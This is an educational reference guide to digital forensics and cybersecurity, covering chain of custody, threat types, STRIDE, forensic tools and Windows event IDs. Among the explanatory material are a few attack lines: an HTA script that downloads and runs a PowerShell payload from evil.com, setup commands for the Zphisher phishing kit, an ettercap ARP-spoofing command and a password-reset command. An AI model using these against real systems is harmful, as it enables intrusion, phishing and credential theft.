# 🔍 Digital Forensics & Cybersecurity Comprehensive Guide

A complete reference guide covering **Digital Forensics (DF)**, **Cyber Forensics (CF)**, and essential cybersecurity concepts with practical examples and tools.

## 📋 Table of Contents

* [📘 Basic Concepts](#-basic-concepts)
* [🔗 Chain of Custody](#-chain-of-custody)
* [🛡️ Security vs Privacy](#️-security-vs-privacy)
* [🎭 Threat Types & Attack Vectors](#-threat-types--attack-vectors)
* [🛠️ Forensics Tools & Techniques](#️-forensics-tools--techniques)
* [🦠 Malware Analysis](#-malware-analysis)
* [💾 Data Acquisition](#-data-acquisition)
* [🔄 Forensic Lifecycle](#-forensic-lifecycle)
* [🚨 STRIDE Framework](#-stride-framework)
* [🧰 Essential Tools List](#-essential-tools-list)
* [🖥️ Windows Security & Authentication](#️-windows-security--authentication)
* [🕵️ Anti-Forensics Techniques](#-anti-forensics-techniques)
* [🔬 Advanced Concepts](#-advanced-concepts)
* [📚 Additional Resources](#-additional-resources)

---

## 📘 Basic Concepts

### 🆚 Digital Forensics (DF) vs Cyber Forensics (CF)

| Aspect                  | Digital Forensics (DF)                             | Cyber Forensics (CF)                    |
| ----------------------- | -------------------------------------------------- | --------------------------------------- |
| **📜 Scope**            | Broad discipline covering all digital devices      | Focus on cybercrime & network incidents |
| **📂 Evidence Sources** | Computers, mobiles, IoT, storage                   | Network logs, servers, communications   |
| **🎯 Primary Use**      | Criminal/civil investigations, corporate incidents | Cybercrime investigations, breaches     |

---

## 🔗 Chain of Custody

**3️⃣ Core Principles:**

1. 🛅 **Keep in Confinement** – Secure storage, tamper-evident bags, access controls
2. ✍️ **Non-Repudiation** – Digital signatures, timestamps, handling logs
3. 🔒 **No Tampering** – Write blockers, forensic copies, preserve originals

📄 **Example Log:**

```
Evidence ID: CASE-2024-001-HD01
Item: Suspect's Laptop Hard Drive
Date/Time: 2024-01-15 09:30
Collected by: Detective Smith (#1234)
Transferred to: Forensics Lab Tech Johnson
Date/Time: 2024-01-15 11:45
Purpose: Digital forensic analysis
```

---

## 🛡️ Security vs Privacy

* **🛡️ Security** – Protecting assets from unauthorized access/modification
  *Example:* Firewalls, encryption, access controls
* **🔏 Privacy** – Protecting identity-specific personal data
  *Example:* GDPR compliance, anonymization

---

## 🎭 Threat Types & Attack Vectors

### 🦠 Malware

* **Trojan** – Disguised as legitimate software
* **Ransomware** – Encrypts files, demands payment
* **Rootkit** – Hides malicious activity

### 🎣 Phishing

* **Standard** – Mass targeting
* **Spear** – Targeted
* **Whaling** – High-profile targets
  💌 *Fake Email Example:*

```
From: security@bankofamerica-secure.com
Subject: Urgent: Account Verification
Click here to verify your account within 24 hours...
```

### 🎭 Spoofing

* **Email** – Fake sender
* **IP** – Forged addresses
* **DNS** – Malicious redirection

### 🧠 Social Engineering

* Pretending to be IT support
* Tailgating into secure areas
* USB baiting

---

## 🛠️ Forensics Tools & Techniques

### 🕸️ Zphisher

```bash
git clone https://github.com/htr-tech/zphisher
cd zphisher && chmod +x zphisher.sh && ./zphisher.sh
```

🔗 [Zphisher GitHub](https://github.com/htr-tech/zphisher)

### 💻 MITM Attacks

* **Ettercap** – `ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//`
* **Bettercap** – `sudo bettercap -iface wlan0`
  🔗 [Bettercap](https://www.bettercap.org/)

---

## 🦠 Malware Analysis

### 🔍 Static Analysis

* **Ghidra** – [Download](https://ghidra-sre.org/)
* **OllyDbg** – [Download](http://www.ollydbg.de/)
* **x64dbg** – [Download](https://x64dbg.com/)

### ⚙️ Dynamic Analysis

* **Cuckoo Sandbox**, **Any.run**

### 💥 HTA Attack Example

```html
<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.run("powershell -c IEX(New-Object Net.WebClient).downloadString('http://evil.com/payload.ps1')");
</script>
```

🔗 [MITRE T1218.005](https://attack.mitre.org/techniques/T1218/005/)

---

## 💾 Data Acquisition

* **📂 Logical** – Faster, targeted files
* **💽 Physical** – Bit-by-bit, includes deleted data

📦 **Faraday Bag** – Blocks all wireless signals, prevents remote wiping

---

## 🔄 Forensic Lifecycle

1. 🔍 Identification
2. 📦 Collection
3. 🧪 Analysis
4. 📝 Documentation
5. 🗄️ Preservation

---

## 🚨 STRIDE Framework

| Letter | Threat           | Example             | Mitigation       |
| ------ | ---------------- | ------------------- | ---------------- |
| S      | Spoofing         | Email/IP spoofing   | Strong auth      |
| T      | Tampering        | MITM, SQL injection | Integrity checks |
| R      | Repudiation      | Action denial       | Audit trails     |
| I      | Info Disclosure  | Data leaks          | Encryption       |
| D      | DoS              | Flood attacks       | Rate limiting    |
| E      | Priv. Escalation | Buffer overflows    | Least privilege  |

---

## 🧰 Essential Tools List

| Tool         | Purpose             | Link                                     |
| ------------ | ------------------- | ---------------------------------------- |
| Autopsy      | Digital forensics   | [🔗](https://www.autopsy.com/download/)  |
| FTK Imager   | Evidence imaging    | [🔗](https://www.exterro.com/ftk-imager) |
| Ghidra       | Reverse engineering | [🔗](https://ghidra-sre.org/)            |
| Velociraptor | Endpoint monitoring | [🔗](https://www.velocidex.com/)         |

---

## 🖥️ Windows Security & Authentication

```cmd
net user        # List users
net user user1 newpass123!   # Reset password
netstat -A -n -o  # Check network connections
```

🔍 Look for unknown outbound TCP connections.

---

## 🕵️ Anti-Forensics Techniques
📄 [Anti Forensics Github](https://github.com/MikeHorn-git/WAFS?tab=readme-ov-file)

* 🗑️ Log deletion
* 🧹 Secure wiping
* ⏳ Timestamp tampering
* 🛡️ Encryption

📄 [Windows Event IDs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)
Key IDs: 4624 (logon), 4724 (password reset), 1102 (log cleared)

---

## 🔬 Advanced Concepts

* 📱 **WakeLock abuse** in Android
* 📦 **APK Manipulation** with `msfvenom`, `jarsigner`
* 🌐 **Shodan** for exposed devices – [Shodan.io](https://www.shodan.io/)
* 🔑 **Mimikatz** credential extraction – [GitHub](https://github.com/gentilkiwi/mimikatz)

---

## 📚 Additional Resources

* 🗂️ [MITRE ATT\&CK](https://attack.mitre.org/)
* 🛡️ [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
* 🎓 [SANS DFIR](https://www.sans.org/cyber-aces/)
* 🏛️ [CISA](https://www.cisa.gov/)

---

**⚠️ Disclaimer:** For **educational use only**. Unauthorized use may violate laws.
**📜 License:** MIT License.

---
